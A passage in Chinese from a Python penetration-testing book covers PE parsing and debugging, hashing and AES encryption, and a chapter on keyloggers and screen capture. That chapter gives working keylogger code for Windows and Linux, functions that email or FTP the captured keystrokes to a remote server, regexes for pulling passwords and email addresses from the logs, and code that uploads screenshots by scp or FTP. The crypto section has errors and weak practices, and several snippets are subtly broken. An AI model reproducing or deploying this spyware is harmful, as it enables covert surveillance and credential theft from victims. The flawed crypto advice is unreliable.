您可以在以下链接中了解更多关于 PE 文件的信息：[`www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx`](http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx) 以及文件头中使用的结构：[`msdn2.microsoft.com/en-gb/library/ms680198.aspx`](http://msdn2.microsoft.com/en-gb/library/ms680198.aspx)。

我们可以使用`pefile`模块（一个用于处理 PE 文件的多平台全功能 Python 模块）在 Python 中获取这些文件头的所有细节。

### 加载 PE 文件

加载文件就像在模块中创建 PE 类的实例一样简单，参数是可执行文件的路径。

首先，导入`pefile`模块：

```py
Import pefile
```

使用可执行文件初始化实例：

```py
pe = pefile.PE('path/to/file')
```

## 检查头部

在交互式终端中，我们可以对 PE 文件头进行基本检查。

像往常一样，导入`pefile`并加载可执行文件：

```py
>>>import pefile 
>>>pe = pefile.PE('md5sum.exe') 
>>> dir(pe)

```

这将打印对象。为了更好地理解，我们可以使用`pprint`模块以可读格式打印此对象：

```py
>>> pprint.pprint(dir(pe))

```

这将以可读格式列出所有内容，如下所示：

![检查标头](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_06_002-2.jpg)

我们还可以打印特定标头的内容，如下所示：

```py
>>> pprint.pprint(dir(pe.OPTIONAL_HEADER))

```

您可以使用 hex()获取每个标头的十六进制值：

```py
>>>hex( pe.OPTIONAL_HEADER.ImageBase)

```

## 检查节

要检查可执行文件中的节，我们必须迭代`pe.sections`：

```py
>>>for section in pe.sections:
 print (section.Name,
      hex(section.VirtualAddress),
      hex(section.Misc_VirtualSize),
      section.SizeOfRawData)

```

## PE 打包器

**打包器**是用于压缩 PE 文件的工具。这将减小文件的大小，并为被静态反向工程的文件添加另一层混淆。尽管打包器是为了减小可执行文件的总体文件大小而创建的，但后来，许多恶意软件作者利用了混淆的好处。打包器将压缩的数据包装在一个工作的 PE 文件结构中，并将 PE 文件数据解压缩到内存中，并在执行时运行它。

我们可以使用签名数据库来检测可执行文件是否被打包。可以通过搜索互联网找到签名数据库文件。

为此，我们需要另一个模块`peutils`，它与`pefile`模块一起提供。

您可以从本地文件或 URL 加载签名数据库：

```py
Import peutils
signatures = peutils.SignatureDatabase('/path/to/signature.txt')
```

您还可以使用以下内容：

```py
signatures = peutils.SignatureDatabase('handlers.sans.org/jclausing/userdb.txt')
```

加载签名数据库后，我们可以使用这个数据库运行 PE 实例，以识别使用的打包器的签名：

```py
matches = signatures.match(pe, ep_only = True)
print matches
```

这将输出可能使用的打包器。

另外，如果我们检查打包的可执行文件中的节名称，它们将有轻微的差异。例如，使用 UPX 打包的可执行文件，其节名称将是`UPX0`，`UPX1`等。

# 列出所有导入和导出的符号

导入项可以列出如下：

```py
for entry in pe.DIRECTORY_ENTRY_IMPORT:
  print entry.dll
  for imp in entry.imports:
    print '\t', hex(imp.address), imp.name
```

同样，我们无法列出导出项：

```py
for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
  print hex(pe.OPTIONAL_HEADER.ImageBase + exp.address), exp.name, exp.ordinal
```

# 使用 Capstone 进行反汇编

**反汇编**是组装的相反过程。反汇编器试图从二进制机器代码创建汇编代码。为此，我们使用一个名为**Capstone**的 Python 模块。Capstone 是一个免费的、多平台和多架构的反汇编引擎。

安装后，我们可以在我们的 Python 脚本中使用这个模块。

首先，我们需要运行一个简单的测试脚本：

```py
from capstone import *
cs = Cs(CS_ARCH_X86, CS_MODE_64)
for i in cs.disasm('\x85\xC0', 0x1000)
   print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

脚本的输出将如下所示：

```py
0x1000:     test  eax, eax

```

第一行导入模块，然后使用`Cs`初始化`capstone` Python 类，它需要两个参数：硬件架构和硬件模式。在这里，我们指示对 x86 架构的 64 位代码进行反汇编。

下一行迭代代码列表，并将代码传递给`capstone`实例`cs`中的`disasm()`。`disasm()`的第二个参数是第一个安装的地址。`disasm()`的输出是`Cslnsn`类型的安装列表。

最后，我们打印出一些这些输出。`Cslnsn`公开了有关已反汇编安装的所有内部信息。

其中一些如下：

+   **Id**：指令的指令 ID

+   **地址**：指令的地址

+   **助记符**：指令的助记符

+   **op_str**：指令的操作数

+   **size**：指令的大小

+   **字节**：指令的字节序列

像这样，我们可以使用 Capstone 反汇编二进制文件。

# 使用 Capstone 的 PEfile

接下来，我们使用`capstone`反汇编器对我们使用`pefile`提取的代码进行反汇编，以获取组装代码。

像往常一样，我们首先导入所需的模块。在这里，这些是`capstone`和`pefile`：

```py
from capstone import *
import pefile
pe = pefile.PE('md5sum.exe')
entryPoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
data = pe.get_memory_mapped_image()[entryPoint:]
cs = Cs(CS_ARCH_X86, CS_MODE_32)
for i in cs.disasm(data, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

`IMAGE_OPTIONAL_HEADER`中的`AddressofEntryPoint`值是相对于图像基地址的入口点函数的指针。对于可执行文件，这是应用程序代码开始的确切位置。因此，我们使用`pefile`获取代码的起始位置，如`pe.OPTIONAL_HEADER.AddressOfEntryPoint`，并将其传递给反汇编器。

# 调试

调试是修复程序中的错误的过程。调试器是可以运行并监视另一个程序执行的程序。因此，调试器可以控制目标程序的执行，并监视或更改目标程序的内存和变量。

## 断点

断点有助于在调试器中选择的位置停止目标程序的执行。在那时，执行停止并控制传递给调试器。

断点有两种不同的形式：

+   **硬件断点**：硬件断点需要 CPU 的硬件支持。它们使用特殊的调试寄存器。这些寄存器包含断点地址、控制信息和断点类型。

+   **软件断点**：软件断点用一个陷阱调试器的指令替换原始指令。这只能在执行时中断。它们之间的主要区别是硬件断点可以设置在内存上。但是，软件断点不能设置在内存上。

# 使用 PyDBG

我们可以使用 PyDBG 模块在运行时调试可执行文件。我们可以通过一个基本的 PyDBG 脚本来了解它的工作原理。

首先，我们导入模块：

```py
from pydbg import *
import sys
```

然后我们定义一个处理断点的函数。它也将`pydbg`实例作为参数。在这个函数内部，它打印出进程的执行上下文，并指示`pydbg`继续执行：

```py
define breakpoint_handler(dbg):
   print dbg.dump_context()
   return DBG_CONTINUE
```

然后我们初始化`pydbg`实例，并设置`handler_breakpoint`函数来处理断点异常：

```py
dbg = pydbg()
dbg.set_callback(EXEPTION_BREAKPOINT, breakpoint_handler)
```

然后附加需要使用`pydbg`调试的进程的进程 ID：

```py
dbg.attach(int(sys.argv[1]))
```

接下来我们将设置触发断点的地址。在这里，我们使用`bp_set()`函数，它接受三个参数。第一个是设置断点的地址，第二个是可选的描述，第三个参数指示`pydbg`是否恢复此断点：

```py
dbg.bp_set(int(sys.argv[1], 16), "", 1)
```

最后，在事件循环中启动`pydbg`：

```py
dbg.debug_event_loop()
```

在这个例子中，我们将断点作为参数传递给这个脚本。所以，我们可以按照以下方式运行这个脚本：

```py
$ python debug.py 1234 0x00001fa6

```

### 注意

`pydbg`包含许多其他有用的功能，可以在文档中找到：[`pedramamini.com/PaiMei/docs/PyDbg/public/pydbg.pydbg.pydbg-class.html`](http://pedramamini.com/PaiMei/docs/PyDbg/public/pydbg.pydbg.pydbg-class.html)。

# 总结

我们已经讨论了可以用 Python 编程逆向工程和调试二进制文件的基本工具。现在你将能够编写自定义脚本来调试和逆向工程可执行文件，这将有助于恶意软件分析。我们将在下一章讨论一些 Python 中的加密、哈希和转换函数。


# 第七章：加密，哈希和转换函数

密码学可以在某些类型的信息安全漏洞中发挥重要作用，因为它有助于实现单向安全交付认证数据，认证令牌的安全交付，访问控制等。单向密码函数用于网站中以一种无法检索的方式存储密码。在本章中，我们将讨论 Python 中的各种密码函数。

本章涵盖的主题如下：

+   哈希函数

+   秘密密钥（加密算法）

+   公钥算法

# 密码算法

以下三种类型的密码算法最常用：

+   **哈希函数**：哈希函数也被称为**单向加密**，没有密钥。哈希函数为明文输入输出固定长度的哈希值，不可能恢复明文的长度或内容。

+   **密钥哈希函数**：密钥哈希用于构建**消息认证码**（**MACs**）；MAC 旨在防止暴力攻击。因此，它们被故意设计成缓慢的。

+   **对称加密/秘密密钥（加密算法）**：加密算法使用可变密钥为一些文本输入输出密文，我们可以使用相同的密钥解密密文。

+   **公钥算法**：对于公钥算法，我们有两个不同的密钥：一个用于加密，另一个用于解密。因此，我们可以共享可以加密消息的公钥，但只能使用未共享的解密密钥解密。

# 哈希函数

哈希函数主要用于加密学中检查消息的完整性，数字签名，操作检测，指纹和密码存储。如果根据输出无法猜测输入字符串，则函数是一个好的哈希函数。由于哈希函数将随机数量的数据转换为固定长度的字符串，可能会有一些输入哈希为相同的字符串。哈希函数被创建为使这些碰撞极其难以找到。最常用的哈希函数如下：

![哈希函数](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_07_001.jpg)

**MD2**，**MD4**和**MD5**具有**128 位**长度，不安全。**SHA-1**具有**160 位**长度，但也不安全。

## 哈希消息认证码（HMAC）

**哈希消息认证码**（**HMAC**）在需要检查*完整性*和*真实性*时使用。它为服务器和客户端提供公钥和私钥。私钥只为服务器和客户端所知，但公钥为所有人所知。

在 HMAC 的情况下，密钥和消息在单独的步骤中被哈希。客户端通过将数据与私钥合并并哈希来为每个请求创建一个哈希，并将其作为请求的一部分发送。在服务器接收到请求后，它生成另一个哈希并将其与接收到的哈希进行比较。如果它们相等，那么我们可以认为客户端是真实的。

## 消息摘要算法（MD5）

MD5 用于通过 128 位消息摘要来保持数据完整性。根据标准，由于两条消息可能具有相同的消息摘要作为输出，或者可能创建一个错误的消息，因此这是*计算上不可行*的。

## 安全哈希算法（SHA）

**SHA**系列在安全应用和协议中被广泛使用，包括 TLS/SSL，PGP 和 SSH。SHA-1 用于版本控制系统，如 Git 和 Mercurial，用于标识修订版本和检测数据损坏。有关 SHA-0 和 SHA-1 报告了一些弱点。因此，建议使用 SHA-2 系列的哈希函数。我们应该在需要抗碰撞的应用程序上使用 SHA-2 系列。

## Python 中的 HMAC

使用 Python 简单地创建文件的哈希。要使用默认的 MD5 算法创建 HMAC 哈希，我们可以使用 Python 中的`hmac`模块：

```py
import hmac 

hmac_md5 = hmac.new('secret-key') 

f = open('sample-file.txt', 'rb') 
try: 
    while True: 
        block = f.read(1024) 
        if not block: 
            break 
        hmac_md5.update(block) 
finally: 
    f.close() 

digest = hmac_md5.hexdigest() 
print digest 

```

第一行导入了`hmac`模块。`hmac`模块从 Python 2.2 开始默认包含在 Python 安装中。然后，使用共享的密钥作为参数启动`hmac`实例。

然后以 1024 字节块读取文件并创建`digest`，最后打印`digest`。

尽管默认的`hmac`模块 Python 的加密算法是 MD5，被认为是不安全的，我们应该使用 SHA 算法。要使用 SHA256，我们必须使用`hashlib`模块。从 Python 2.5 版本开始，`hashlib`随默认 Python 安装。因此，我们可以更新前面的脚本以使用 SHA256：

```py
import hmac 
import hashlib 

digest_maker = hmac.new('secret-key', '', hashlib.sha256) 

f = open('sample-file.txt', 'rb') 
try: 
    while True: 
        block = f.read(1024) 
        if not block: 
            break 
        digest_maker.update(block) 
finally: 
    f.close() 

digest = digest_maker.hexdigest() 
print digest 

```

同样，我们可以在`hmac`中包含其他`hashlib`方法。

## hashlib 算法

要使用特定的哈希算法，我们可以使用`hashlib`模块中的适当构造函数创建哈希对象，该对象可用于与哈希进行交互。`hashlib`模块由 OpenSSL 支持，因此`hashlib`中的所有算法，如`md5`、`sha1`、`sha224`、`sha256`、`sha384`和`sha512`都可用。

![hashlib 算法](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_07_002.jpg)

以下是重要的`hashlib`方法：

+   `hashlib.md5()`: 创建 MD5 哈希对象

+   `hashlib.sha1()`: 创建 SHA1 哈希对象

+   `hashlib.new(hash_name)`: 通过名称传递算法以创建哈希对象

例如，尝试以下代码：

```py
try: 
    hash_name = sys.argv[1] 
except IndexError: 
    print 'Specify the hash name as the first argument.' 
else: 
    try: 
        data = sys.argv[2] 
    except IndexError:     
        print 'Specify the data to hash as the second argument.' 
h = hashlib.new(hash_name) 

```

这将创建一个哈希对象，该对象使用我们作为第一个参数传递的哈希算法名称。方法`update()`将重复调用哈希计算器并相应地更新摘要。

## 密码哈希算法

MD5、SHA1 和所有 SHA 变种都旨在非常快速。在密码的情况下，快速算法容易受到暴力破解攻击的影响，因为 MD5 和 SHA1 的哈希可以以每秒数百万或数十亿的速度产生。有一些专门设计用于密码的算法。我们可以使用 Argon2，并在可用时将其视为首选。另外两个主要选项是`pbkdf2`和`bcrypt`。这些函数计算成本很高，因此可以保护您免受暴力破解和字典攻击。

我们可以使用`argon2`模块来使用 Argon2：

```py
import argon2 
hashed = argon2.argon2_hash("password", "some_salt", ) 

```

此外，我们可以使用模块`bcrypt`和`pbkdf2`来使用这些算法。

使用`bcrypt`的示例如下：

```py
import bcrypt 
hashed = bcrypt.hashpw(password, bcrypt.gensalt()) 

```

这将使用随机生成的盐对密码进行哈希处理。

使用`pbkdf2`的示例如下：

```py
import pbkdf2 
salted_password = pbkdf2.pbkdf2_hex(password, some_random_salt, 
                                  iterations=1000, keylen=24)

```

这将使用`1000`次迭代创建一个 24 字节长的哈希。我们可以通过增加迭代次数来减慢哈希函数的速度。

## 对称加密算法

对称加密算法，或称为秘密密钥算法，使用私有变量密钥将其输入数据或明文转换为密文。我们可以使用相同的密钥解密密文，该密钥用于加密消息。密码是一种简单的加密和解密消息的方法。

加密算法主要分为两类：

+   **对称加密中使用的算法**：对称加密是一种同时用于加密和解密的单一密钥。一些对称加密算法的示例包括 AES、Blowfish、DES、IDEA、serpent 等。

+   **非对称加密中使用的算法**：非对称加密使用两个密钥：私钥和公钥——一个用于加密，另一个用于解密。非对称算法的示例包括 Diffe-Hellman（**DH**）和**RSA**。

### 提示

您可以在这里阅读更多关于对称加密的内容：[`www.cs.cornell.edu/courses/cs5430/2010sp/TL03.symmetric.html`](http://www.cs.cornell.edu/courses/cs5430/2010sp/TL03.symmetric.html)。

### 块和流密码

**分组密码**加密已知为块的固定大小数据。通常，每个块的大小相对较大，为 64 位、128 位或 256 位。因此，分组密码将每个块分别加密到与密文相同大小。在输入位较短于块大小的情况下，会调用填充方案。每个块都使用相同的密钥。分组密码的例子包括 AES、DES、Blowfish 和 IDEA。

**流密码**一次加密一位或一字节的小块明文。它使用无限的伪随机位流作为密钥，这个伪随机生成器应该是不可预测的。此外，为了以安全的方式实现流密码，密钥不应该被重复使用。

## PyCrypto

**PyCrypto**，全称**Python 密码学工具包**，是一个包含哈希函数和加密算法的不同加密模块的集合。PyCrypto 模块提供了在 Python 程序中实现强加密所需的所有函数。

要使用加密算法，我们可以从`Crypto.Cipher`中导入它：

```py
from Crypto.Cipher import AES 
encrypt_AES = AES.new('secret-key-12345', AES.MODE_CBC, 'This is an IV456') 
message = "This is message " 
ciphertext = encrypt_AES.encrypt(message) 
print ciphertext 

```

这将创建密文。由于 PyCrypto 块级加密 API 非常低级，它只接受 16、24 或 32 字节长的密钥用于 AES-128、AES-196 和 AES-256，分别。密钥越长，加密越强。我们可以按以下方式解密它：

```py
decrypt_AES = AES.new('secret-key-12345', AES.MODE_CBC, 'This is an IV456') 
message_decrypted =  decrypt_AES.decrypt(ciphertext) 
print message_decrypted 

```

现在我们将得到我们的明文。

### 文件的 AES 加密

**高级加密标准**（**AES**）是一种对称分组密码，由三种分组密码组成：AES-128、AES-192 和 AES-256。每个加密/解密数据的块大小为 128 位，密钥分别为 128、192 和 256 位。

以下脚本加密所提供的文件。此外，它处理**初始化向量**（**IV**）的随机生成。

首先加载所有所需的模块：

```py
from Crypto.Cipher import AES 
import os, random, struct 

```

现在，定义加密文件的函数：

```py
def encrypt_file(key, filename, chunk_size=64*1024): 

    output_filename = filename + '.encrypted' 

```

在函数内部创建初始化向量：

```py
iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
# Initialization vector  

```

然后我们可以在 PyCrypto 模块中初始化 AES 加密方法：

```py
    encryptor = AES.new(key, AES.MODE_CBC, iv) 
    filesize = os.path.getsize(filename)  

```

读取文件并写入加密输出文件：

```py
     with open(filename, 'rb') as inputfile: 
        with open(output_filename, 'wb') as outputfile: 
            outputfile.write(struct.pack('<Q', filesize)) 
            outputfile.write(iv) 

            while True: 
                chunk = inputfile.read(chunk_size) 
                if len(chunk) == 0: 
                    break 
                elif len(chunk) % 16 != 0: 
                    chunk += ' ' * (16 - len(chunk) % 16) 

                outputfile.write(encryptor.encrypt(chunk)) 

```

最后，调用函数加密文件：

```py
encrypt_file('abcdefghji123456', 'sample-file.txt');

```

现在我们可以检查如何解密这个加密文件。要编写一个可以解密的函数，我们必须导入相同的模块。然后，定义函数如下：

```py
def decrypt_file(key, filename, chunk_size=24*1024): 

    output_filename = os.path.splitext(filename)[0] 

```

读取加密文件并输出解密文件：

```py
    with open(filename, 'rb') as infile: 
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0] 
        iv = infile.read(16)

```

初始化`decryptor`方法以解密文件：

```py
        decryptor = AES.new(key, AES.MODE_CBC, iv) 

        with open(output_filename, 'wb') as outfile: 
            while True: 
                chunk = infile.read(chunk_size) 
                if len(chunk) == 0: 
                    break 
                outfile.write(decryptor.decrypt(chunk)) 

            outfile.truncate(origsize) 

```

最后，输出原始解密文件：

```py
decrypt_file('abcdefghji123456', 'sample-file.txt.encrypted'); 

```

# 摘要

我们已经讨论了 Python 中使用的哈希和加密模块。现在您将能够在您的脚本中使用这些模块。我们将在下一章中讨论一些键盘记录技术。


# 第八章：键盘记录和屏幕截取

使用 Python，我们可以以编程方式执行诸如捕获所有按键、捕获屏幕、记录正在运行的程序、关闭它们、监视剪贴板内容等任务。黑客可能使用这些技术恶意获取受害者的私人信息，而雇主可能使用它们来监视员工的活动。

本章涵盖的主题如下：

+   使用 Python 进行键盘记录

+   屏幕截取

# 键盘记录器

**键盘记录器**是一种实时记录按键的软件或硬件设备。它们用于解决计算机和网络的技术问题。它们也可以用于在没有直接知识的情况下监视人们的网络和计算机使用情况。因此，这也可以在公共计算机上被滥用来窃取密码或信用卡信息。

## 硬件键盘记录器

基于硬件的键盘记录器可以在没有安装任何软件的情况下监视受害者的活动。它们可以很容易地被检测到，因为它是一个物理设备，可能连接在计算机键盘和 USB/PS2 端口之间的某个地方。还有更先进的硬件键盘记录器，它们在外部不可见，也不依赖于任何软件。因此，它们无法被任何软件检测到。但是，硬件键盘记录器需要对受害者进行物理访问。

对于无线键盘，可以拦截从键盘发送到其接收器的信号，使用无线嗅探器。

## 软件键盘记录器

使用软件键盘记录器，我们可以从远程系统提供对本地记录的按键的访问。这可以通过将记录的按键上传到数据库或 FTP 服务器来实现。我们还可以定期将其作为电子邮件附件发送。

# 使用 pyhook 的键盘记录器

要创建一个简单的键盘记录器脚本来记录计算机上的按键活动并将其存储在文本文件中，我们可以使用`pyhook`模块。这将为 Windows 系统提供全局鼠标和键盘事件的回调。

导入所需的模块。在这里，我们从 ActivePython Package 导入`pyhook`和 pythoncom 模块。`pythoncom`模块在此脚本中用于为当前线程传递所有消息：

```py
import pyHook, pythoncom, sys, logging 

```

定义保存日志数据的文件。 （Windows 文件名使用反斜杠作为分隔符。但是，在 Python 中，反斜杠是一个转义字符，所以我们必须在路径中放置双斜杠`\\`。否则，我们可以使用原始字符串来定义文件名。）：

```py
file_log='C:\\log.txt' 

```

现在我们可以定义处理每个键盘事件的函数。在这里，我们可以利用日志模块来记录每个字符：

```py
def OnKeyboardEvent(event): 
    logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s') 
    chr(event.Ascii) 
    logging.log(10,chr(event.Ascii)) 
    return True 

```

在这里，我们实例化`pyhook`管理器：

```py
hooks_manager = pyHook.HookManager() 

```

在每次按键时调用键盘事件函数：

```py
hooks_manager.KeyDown = OnKeyboardEvent 
hooks_manager.HookKeyboard() 
pythoncom.PumpMessages() 

```

这将在 Windows 系统中工作。要在 Linux 中使用，我们必顈依赖另一个模块：`pyxhook`。您可以从[`github.com/JeffHoogland/pyxhook`](https://github.com/JeffHoogland/pyxhook)获取此模块。

使用`pyxhook`，您可以重写前面的脚本以在 Linux 中使用：

```py
import pyxhook 
file_log=/home/rejah/Desktop/file.log' 
def OnKeyboardEvent(event): 
   k = event.Key 

    if k == "space": k = " " 

   with open(file_log, 'a+') as keylogging: 
      keylogging.write('%s\n' % k)   

#instantiate HookManager class 
hooks_manager = pyxhook.HookManager() 

#listen to all keystrokes 
hooks_manager.KeyDown=OnKeyPress 

#hook the keyboard 
hooks_manager.HookKeyboard() 

#start the session 
hooks_manager.start() 

```

我们可以改进脚本以将按键记录到远程服务器或处理特定的按键。

要将记录的按键发送到电子邮件，我们可以使用`smtplib`模块。我们需要导入所需的模块：

```py
import time 
import datetime 
import smtplib 
from email.mime.text import MIMEText

```

然后我们可以定义通过连接到我们的 SMTP 服务器发送电子邮件的方法：

```py
def sendEmail(data,to): 
    try: 
        # Provide from email address 
        from = 'you@yourdomain.com' 
        # Your SMTP username 
        username = 'keylogger' 
        # Your Email password 
        password = 'asd123' 
        # Use MIMEText to create an email 
        mail = MIMEText(data, 'html') 
        mail['Subject']  = "Keylogger Data --" +str(datetime.datetime.now()) 
        mail['From']=from 
        mail['To'] = to 

        # Send the message via your SMTP server 
        server = smtplib.SMTP('smtp.yourdomain.com:587') 
        # Enable TLS if required 
        server.starttls() 
        server.login(username,password) 
        server.sendmail(from, [to], mail.as_string()) 
        server.quit() 
    except: 
        pass

```

现在我们可以将数据和地址传递给这个方法。这将把按键发送到指定的地址。现在我们可以重写`OnKeyboardEvent`方法来发送按键：

```py
def OnKeyboardEvent(event): 
    # Write character only if its not a null or backspace  
    if event.Ascii !=0 or 8: 
        # Open log file and read the current keystrokes in log file 
        f=open('c:\log.txt','r+') 
        buffer=f.read() 
        f.close()  

        if len(buffer)%100==0 and len(buffer)%100!=0: 
            #send last 1000 characters to the email 
            send_email(buffer[-1000:].replace("\n","<br>"),email) 

        # Open the log.txt file to update new keystrokes 
        f=open('c:\log.txt','w') 
        keylogs=chr(event.Ascii) 

        # if the key pressed is ENTER, update with /n  
        if event.Ascii==13: 
            keylogs='\n' 

        #if the key pressed is space, update with space  
        if event.Ascii==32: 
            keylogs='  ' 

        # Add new keystrokes to buffer 
        buffer+=keylogs 

        # Write the buffer to log file 
        f.write(buffer) 
        # close the log file 
        f.close() 

```

现在，当日志文件中有 1000 个字符时，这将把按键发送到指定的电子邮件 ID。同样，我们可以添加一个方法将文件上传到 FTP 服务器。在这里，我们必须导入`ftplib`模块和`os`模块：

```py
import ftplib 
import os 

```

然后，定义将文件上传到 FTP 服务器的方法

```py
def uploadToFTP(data,to): 
    # Write data to a file 
    fileName="log-"+str(datetime.datetime.now()+".txt" 
    logFile=open(fileName,"a") 
    logFile.write(data) 
    logFile.close() 

    try: 
        # Provide FTP server address 
        server = 'yourdomain.com' 
        # Your FTP username 
        username = 'keylogger' 
        # Your FTP password 
        password = 'asd123' 
        # SSL state, set 1 if SSL enabled in server 
        SSL = 0 
        # FTP Directory to upload the file 
        directory = "/"  
        # Create normal FTP connection If SSL disabled 
        if SSL==0: 
            connection=ftplib.FTP(server,username,password) 
        # Create SSL enabled FTP connection 
        elif SSL==1: 
            connection=ftplib.FTP_TLS(server,username,password) 

        # Change directory in FTP connection 
        connection.cwd(directory) 
        # Open the log file 

        logFile=open(fileName,'rb') 
        # Upload the file to FTP server 
        connection.storbinary('STOR' +' '+fileName,logFile) 
        # Close the FTP connection 
        connection.quit() 
        # Close the log file 
        logFile.close() 
        # Delete the temporary log file 
        os.remove(fileName) 
    except: 
        pass
```

现在我们可以在`OnKeyboardEvent`函数中使用此方法将按键上传到 FTP 服务器。

键盘记录器的输出将是一个巨大的文件，其中包含隐藏的数据的数兆字节文本。我们可以使用正则表达式扫描此文件以获取所需的数据。例如，两个正则表达式可以匹配一堆文本中的用户名和密码。

要识别电子邮件 ID，可以使用以下正则表达式：

```py
 ^[\w!#$%&'*+\-/=?\^_`{|}~]+(\.[\w!#$%&'*+\-/=?\^_`{|}~]+)*@((([\-\w]+\.)+[a-zA-Z]{2,4})|(([0-9]{1,3}\.){3}[0-9]{1,3}))$ 

```

要识别超过六个字母的类似密码的模式：

```py
(?=^.{6,}$)(?=.*\d)(?=.*[a-zA-Z])

```

使用正则表达式，我们可以搜索具有模式并且可以构建为正则表达式表达式的任何数据。此类数据的一些示例包括社会安全号码、信用卡号码、银行账户、电话号码、姓名、密码等。

# 屏幕截取

屏幕抓取程序捕获受害者的桌面并将图像发送到远程服务器。有许多 Python 模块可用于以编程方式抓取屏幕的光栅图像。我们可以利用**Python 图像库**（**PIL**）用于 Windows 和 OSX。 PIL 包含`ImageGrab`模块，可用于抓取屏幕截图。

导入模块，这里我们还导入时间模块以使执行休眠三秒，允许用户在抓取之前切换屏幕显示：

```py
from PIL import ImageGrab 
import time

```

休眠三秒并拍摄屏幕截图：

```py
time.sleep(3) 
ImageGrab.grab().save("screen_capture.jpg", "JPEG") 

```

我们还可以通过提供以下区域来在屏幕上拍摄特定区域的屏幕截图：

```py
ImageGrab.grab(bbox=(10,10,510,510)).save("screen_capture.jpg", "JPEG") where, bbox=(X1,Y1,X2,Y2)

```

以下截图说明了示例：

![屏幕截图](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_08_001.jpg)

要在 Linux 系统上抓取屏幕截图，我们必须使用具有跨平台兼容性的`wxPython`库。我们可以从[`wxpython.org/download.php`](http://wxpython.org/download.php)下载 wxPython

导入 wx 模块：

```py
import wx 

```

首先，创建应用程序实例：

```py
wx.App()

```

`wx.ScreenDC`方法提供对整个桌面的访问，其中还包括任何扩展的桌面监视器屏幕：

```py
screen = wx.ScreenDC() 
size = screen.GetSize() 

```

创建具有屏幕大小的新空位图作为目的地：

```py
bmp = wx.EmptyBitmap(size[0], size[1]) 
mem = wx.MemoryDC(bmp) 

```

将屏幕位图复制到返回的捕获位图中：

```py
mem.Blit(0, 0, size[0], size[1], screen, 0, 0) 
del mem 

```

将位图保存为图像：

```py
bmp.SaveFile('screenshot.png', wx.BITMAP_TYPE_PNG) 

```

此外，我们可以将此屏幕截图发送到远程位置，只需对脚本进行最小更改。例如，我们可以使用`scp`协议将其发送到另一台服务器：

```py
import os 
os.system("scp screenshot.png user@remote-server.com:/home/user/")

```

或者，我们可以使用`ftplib`使用 FTP 协议上传文件：

导入模块`ftplib`：

```py
import ftplib 

```

使用远程服务器凭据开始新会话：

```py
session = ftplib.FTP('remote-server.com','user','password') 

```

使用以下代码打开文件：

```py
file = open('screenshot.png','rb')

```

发送文件：

```py
session.storbinary('STOR screenshot.png', file)

```

关闭文件和 FTP 会话：

```py
file.close()                                     
session.quit() 

```

# 总结

我们已经讨论了您可以使用 Python 进行按键记录和屏幕截图的基本模块。现在，您可以创建这些脚本的定制版本来记录按键并抓取屏幕截图。我们将在下一章中讨论一些攻击自动化技术。
